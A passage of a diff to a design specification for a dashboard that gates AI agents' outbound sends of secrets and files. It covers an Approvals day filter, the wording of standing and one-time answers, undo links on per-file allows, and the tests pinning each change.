+(after `q=`, before Rule changes' `changes=` and `cday=`, §4.25 *Go to a
+day on Rule changes*; replaced, not pushed), so a
+reload, Back and a typed address keep it, a link to Approvals starts at the
+newest, a `day=` that is not a real date is none (`historyDayParam`), and
+an address that opens one answer (`/approvals/<id>`) has none, as it has
+no search; choosing a day there drops the answer with its mark.
+
+- *Which moment.* The list is ordered by when each answer was decided
+  (`resolvedAt`), else, for an answer not stamped, by when it was last
+  asked (`lastSeen`), which every answer has; the cut uses that same
+  moment (`answeredBefore` in `view-model/home.ts`, pure), so going to a
+  day never draws an answer from after it. An answer not stamped has no
+  heading of its own (*Answers sit under their day*): it stays in its place
+  under the heading before it. (The queue item said "an answer with no
+  time is kept, at the end"; its approval hold showed there is none, every
+  answer has `lastSeen`.)
+- *The server cuts.* `GET /api/home/answered?before=<epoch ms>` keeps the
+  answers whose moment is before it, before the search and the page cut,
+  so `total`, `next`, `after` and Show more count and page through the cut
+  list; the answer adds `before: { at, all }` (`all`: every answer, so the
+  page tells "nothing on or before that day" from no answer at all).
+- *The page.* With a day, the list is that day's reads, never `/api/home`'s
+  newest 20, as with a search (`answeredList`); Show more
+  (`moreAnswered`) and the poll (`followAnswered`) carry `before=` too.
+  The status line says where the list starts, in History's words: "From
+  Tuesday, Oct 20 back" ("From yesterday back"; with a search, "3 of 63
+  answers match, from Tuesday, Oct 20 back"); Show more says "Showing 20
+  of 41 answers from Tuesday, Oct 20 back.". Nothing on or before the day
+  reads "You answered nothing on or before Tuesday, Oct 20." (with a
+  search, "No answer matches “x” on or before …") with Show the newest,
+  said to a screen reader by the status line as a search that finds none
+  is. Show the newest, or clearing the box, empties the day, the address
+  and the line, keeps the search, and focuses the box.
+- Nothing about what an answer does, or its reversal, changes: the cut
+  reads the times the open route already serves on every row.
+
+Tests: unit `view-model/answered-day.test.ts` (the cut at the bound, the
+bound itself out, `total`/`next`/`after` over the cut list, a search with
+it, an answer not stamped cut by `lastSeen`, a non-finite bound), jsdom
+`home-js-answered-day.test.ts` (the box and its label, `before=` the next
+local day's start, `day=` replaced in the address, the line and the first
+heading, Show more and the poll keep it, Show the newest, a search and a
+day together, the empty lines, `?day=` on load, Back, a link, a bad date,
+an answer the address opens), component `answered-day.test.ts` (the real
+`DashboardServer` over answers on three days and one not stamped: the cut,
+`total`, `next` and Show more past the day, with `q`, a bad `before`),
+stack `tests/stack/answered-day.test.ts` (a real arbiter at `secrets` on a
+DB holding answers of three days: the route and the served
+`/approvals?day=` list only the middle day back, under its heading; Show
+the newest; no value or token).
+
 **A rule change your agent asked for is never "nothing"** (2026-10-12).
 The inspector's *Waiting for your answer* lists the gates' questions
 (`/api/policy/panel`). A rule change your agent asked for (§4.25,
@@ -22389,16 +29098,20 @@ row's actions in the product's order and words: **Allow once**
 (`{approve: true, scope: "once"}`) · **Always allow** (`{approve: true}`) ·
 **Block** (`{approve: false}`); one run of a program that runs code no pin
 names (`…#run:`) gets no Always allow (confidentiality plan 13 §8 (c)). The
-reversal on an answered row is **Block instead** / **Allow instead** (a
-held message's: none, or the session's own, *A held message's answer*). The
-verb is read from `scope` and `approve`, never the label, everywhere:
+reversal on an answered row is **Block instead** / **Always allow instead**
+on the product page (**Allow this session instead** / **Allow once instead**
+where the arbiter keeps the allow narrower, §4.25 *The allow that reverses
+a Block names its scope*; the server's label, which the developer view draws,
+stays **Allow instead**; a held message's: none, or the session's own, *A
+held message's answer*). The verb is read from `scope` and `approve`, never
+the label, everywhere:
 
 | Button | POST | What it records |
 |---|---|---|
 | Allow once | `/api/egress/approvals/<id>/approve-once` | one use, then it asks again |
 | Always allow | `…/<id>/approve` | a standing allow |
 | Block | `…/<id>/deny` | a standing block |
-| Block instead / Allow instead | `…/deny` / `…/approve` | the one-click change of an answer |
+| Block instead / Always allow instead (Allow this session instead, Allow once instead) | `…/deny` / `…/approve` | the one-click change of an answer; the allow is kept as the words say |
 | Allow this session (a program's send, *A send names every file*) | `…/<id>/approve` | a standing allow on a row keyed to one session |
 | Always: add <host> to <file> (the same card, one per file in the way) | `…/<id>/always-source {path}` | no answer: that file's rule in policy.yaml gains the host |
 | Send without it (a secret's placeholder in a request, *Send without it* below) | `…/<id>/send-without` | one use: the next such request goes with `[hidden by Mandu]` where the secret was; then it asks again |
@@ -22444,6 +29157,125 @@ Pinned by `dashboard/test/unit/view-model/send-without-actions.test.ts`,
 case of `dashboard/test/unit/server/egress-approvals-routes.test.ts`, and
 e2e `tests/stack/send-without-net-proxy.test.ts` (the production adapter's
 answer over a real arbiter, the real net-proxy, a recording sink).
+
+**A send question says what its standing answers keep doing**
+(2026-10-26). The send card explained *Allow once* (its third cell, about
+the next request) and *Send without it* (the note above), but not the two
+answers that last: the page head said only "Always allow and Block are
+remembered under Rules", so the card did not tell whether *Always allow*
+was for this key or every key, this agent or every agent, nor whether
+*Block* stopped other hosts. The card about a secret sent to a host now
+has a second note under *Send without it*, above the buttons, in its style:
+
+> **If you click Always allow or Block:** Mandu remembers it for
+> `STRIPE_KEY` and `api.stripe.com` only. Always allow: from now on, any
+> agent's request that sends it to `api.stripe.com` goes with the real
+> secret filled in, without asking. Block: those requests are refused
+> without asking. Your answer does not cover other secrets or other hosts.
+> You can change it under Rules.
+
+- **The words follow the arbiter.** A standing answer is one row per
+  {secret, host} (egress-approvals.ts, the UNIQUE index on `(symbol,
+  destination)`, the host less a default port), consulted before any rule
+  and the same for every asker (`consultPriorVerdict`: "A standing
+  (*always*) answer is the same to every asker"), so it holds for any
+  session and agent. A file's card stands for the file at that host
+  (egress-hold.md "One card per file") and says "the secrets in
+  `~/app/.env`", "them" and "the real secrets"; a secret with no name of
+  its own says "this secret". The line never says other secrets or hosts
+  "still ask" (a rule or a built-in protection may decide them), only that
+  the answer does not cover them, and it says "filled in", never where in
+  the request (where a kept value may be put back is an open decision).
+  It promises nothing about a refusal the gate makes before any answer (a
+  credential declared for https sent over plain HTTP).
+- **When it shows.** On a send of a secret to a named host (the `send`
+  family's network card; never a program's send, a session's card, a file
+  upload, a held message or any other family), and only for the halves the
+  card offers as standing answers (`actions`: an approve, and a deny that
+  is not *Send without it*, neither scoped `once`): a card offering only
+  *Block* says "If you click Block:" and "Block: from now on, any agent's
+  request that sends it to … is refused without asking."; one offering
+  neither has no line. On the expanded card only (Approvals, a session's
+  *Needs your OK*), as the cells; Home's short card says its short form
+  instead (*Home's card says which answers last*, below).
+- **Where the words come from.** ask-words.ts builds them as parts
+  (`ifStandingParts`, its string `ifStanding`, the same words joined), the
+  names as code and the closing "Rules" a link part to Your rules on Rules
+  (`to: "your-rules"`), where a remembered answer is kept: no row exists
+  until you answer (*A remembered answer opens where Rules keeps it* links
+  the row after). home.js draws them with `askCellWords`, which now draws
+  a link part as `placeLink` does, under the heading the card's own button
+  labels make (`standingHead`). The developer view's words carry them too
+  (it lists no answers, so they read as the send's usual both); it draws
+  nothing new. No CSS of its own: a `.note`, kept in print as the other
+  lines are.
+
+Pinned by `dashboard/test/unit/view-model/ask-cells-parts.test.ts` (P8:
+the words, the halves, no line elsewhere, product vocabulary),
+`file-card-asks.test.ts` (the file's card), `home-js-approvals.test.ts`
+(the line under *Send without it*, the Rules link, Block alone, none on
+Allow once alone or on Home's short card), and e2e
+`tests/stack/approval-standing-words.test.ts`: a real arbiter, two
+net-proxies for two sessions in the production wiring and the real
+answer routes; *Always allow* lets the other session's send of the same
+secret to the same host go with the real value on the wire and no
+question, while the same secret to another host and another secret to
+that host ask; *Block* refuses either session's send of its pair with no
+new question, while the other pairs ask; no value in any answer, page or
+route.
+
+**Home's card says which answers last** (2026-10-29). Home is where the
+hero, the tab title and a notification send the person, so most answers
+are given on its short card, which draws none of the lines above: it read
+"Claude Code wants to send your secret `STRIPE_KEY` to `api.stripe.com` …
+Details in Approvals" beside the four buttons, and nothing on Home said
+that two of them last and two do not. The short card of a send of a secret
+to a host now has one line of its own in its sub line, between the moment
+and *Details in Approvals*, in the sub line's dim words:
+
+> Allow once and Send without it cover only the next such request. Always
+> allow and Block are kept for `STRIPE_KEY` and `api.stripe.com` until you
+> change them under Rules.
+
+- **The short form of the line above, no more.** It is built beside
+  `ifStandingParts` (ask-words.ts `answersShortOf`, `answersShort` and its
+  parts) and only where that line is, so it rests on the same check
+  against the arbiter: a standing answer is kept per {secret, host} and
+  never expires until removed under Rules; a once answer (*Allow once*,
+  *Send without it*) satisfies exactly one later decision
+  (egress-approvals.ts, VERDICT SCOPE). It says "the next such request",
+  as *If you click Send without it* does, never "this request": the gate
+  refused this one, and an answer applies to the next try. A file's card
+  says "the secrets in `~/app/.env`", a secret with no name "this secret";
+  "Rules" is a link part to Your rules, as in the line above.
+- **Only the answers the card offers, in its words.** The one-time verbs
+  are the `actions` an approve or a *Send without it* scoped `once`; the
+  standing ones as `standingOf` reads them; each named by its label, as
+  the buttons are ("Allow once covers …", "Block is kept … change it").
+  The line shows only when the card offers both kinds, so Home's server
+  passes describeAsk the card's own answers as `cardActions`
+  (`sendWithoutActions`, with *Send without it*); a row as the panel holds
+  it has none, so the developer view's words stay as they were.
+- **Not elsewhere.** A program's send of the files it holds (its *Allow
+  this session* lasts the session, not until changed under Rules), a
+  session's card, a held message and every other family have no
+  `ifStanding` and so no short line; the expanded card (Approvals, a
+  session's *Needs your OK*) does not draw it, since it says the full line.
+- **Layout.** A `span.ask-answers` with `display: block` in `.ask-sub`,
+  word spaces around it so its text reads apart from the moment and the
+  link; on a phone it wraps as the sub line does.
+
+Pinned by `dashboard/test/unit/view-model/ask-cells-parts.test.ts` (P9:
+four answers, no *Send without it*, Block alone, a file's card, an unnamed
+secret, a server-worded label; none without answers, without both kinds,
+nor on any other family), `dashboard/test/unit/ui/home-js-ask-actions.test.ts`
+(the line before *Details in Approvals* with Rules a link, naming only the
+card's buttons; none on the expanded card), and e2e
+`tests/stack/ask-top-row.test.ts` (A4: a real pending send of a registered
+variable to an unbound host over a real arbiter; Home's served card says
+the line with the variable and the host as code; `/api/home` sends the
+same words with the name, no `$MDU` form; no value in any page or answer)
+and `tests/stack/ask-from-session.test.ts` (F3).
 
 A held message (`prompt:` rows, plan 15 §7) keeps its four answers (Send
 as written · … for this session · Send masked · Cancel the message) and is
@@ -22554,9 +29386,31 @@ the way, and whether an *Always* can change its rule, or why not).
   changed. Press Always again to add this place to the rule as it is
   now."), nothing written (2026-10-18). The
   answer says "Done: ~/ws/app/.env may go there now. Still in the way:
-  ~/data/customers.csv." and the card stays; after the last file, "every
-  file may go there now, so the program's next send goes" and the card is
-  gone (the arbiter retires it: the law answers it). A file whose rule
+  ~/data/customers.csv. *Undo it in Approvals*" and the card stays, its
+  other buttons too, so the person goes on with the next file. Every
+  Always on a file links the change it made, not only the last: the link
+  opens `/approvals/<changeId>` as the last file's line does (below); the
+  answer keeps the change id with its words (`keepAnswer`, `S.answers`),
+  so a poll that draws the card again puts the link back with them
+  (`showAnswer`, `letDone`'s optional link; the prompt-filter rows pass
+  none). The same link follows "Done: every file may go there now, …" on
+  a card no answer line is drawn for. An older server that sends no change
+  id: no link. Until 2026-10-26 only the last file's Always had a way back
+  from the card, the others' only plain words. After the last file (the
+  route's `released`, never a card a poll stopped drawing) the card is gone
+  (the arbiter retires it: the law answers it), and its place holds an
+  answer line like any other answer (§4.25 *An answer says what it did*):
+  "**Always allowed:** Claude Code's program wants to send data from
+  `~/ws/app/.env` and `~/data/customers.csv` to `hooks.slack.com`. Tell
+  Claude Code to try again. *Undo it in Approvals*". Its link is not
+  *Change your answer*: the question was retired, not answered, so Answered
+  earlier has no row for it; it opens `/approvals/<changeId>` (the route's
+  `changeId`, a `pc-…` id), Rule changes with that change marked and its
+  Undo. An older server that sends no change id: the line has no link.
+  Until 2026-10-25 the last file's words ("… so the program's next send
+  goes. After you answer, tell the agent to try again.") were drawn inside
+  the card and went with it, so nothing said what was done (`home.js
+  alwaysSource`). A file whose rule
   covers a whole folder with readers, a rule still kept on the Rules page,
   or a copy whose source is no longer secret shows why it has no button
   ("Change it under Rules."), those words a link to the file's rule
@@ -22575,7 +29429,9 @@ never a value. Text at 12px or more, and the list wraps at phone width
 (`.ask-source` wraps, a long path breaks anywhere). Tests: dashboard
 `holder-send-asks.test.ts`, `home-js-holder-send.test.ts`,
 `always-source-route.test.ts`; stack
-`tests/stack/approval-always-per-source.test.ts`.
+`tests/stack/approval-always-per-source.test.ts`, and over the served page
+`tests/stack/always-source-answer-line.test.ts` (the line, its Undo; an
+earlier file's link and its Undo).
 
 **Approvals** (`#approvals-area`). "Waiting for your answer" (with the
 count) and "Answered earlier", the product's headings. Each waiting card is
@@ -22812,7 +29668,7 @@ for it, and a script's own scroll, are not the person's input.
   terminal and open the sign-in link it prints." The verb is the control's:
   - Allow once, Always allow, Block and a held message's answers: "answer
     this question";
-  - Answered earlier's Block instead and Allow instead: "change your answer";
+  - Answered earlier's Block instead and Always allow instead: "change your answer";
   - Add rule and "Always allow from …": "add a rule";
   - Add rule for a website: "trust a website"; for a connection: "allow
     connecting";
@@ -23908,7 +30764,9 @@ file, so:
   credentials are: approvals, labels, posture, deletion and the reads that
   carry values work with the cookie and the CSRF header.
 - **Sign out.** Settings › Dashboard account (shown only to a browser that
-  holds a sign-in session: `/api/home`'s `signIn.signOut`) has a Sign out
+  holds a sign-in session: `/api/home`'s `signIn.signOut`; its address is
+  `/settings#account`, with a link in Settings' section row while the card
+  shows, since 2026-11-04, §4.25 *Section links*) has a Sign out
   button, a plain form `POST <base>/logout`. The server drops the session
   (the cookie is dead even if a browser kept it), clears both cookies and
   answers 303 to `<base>/login?out=1`, the sign-in page with "You are signed
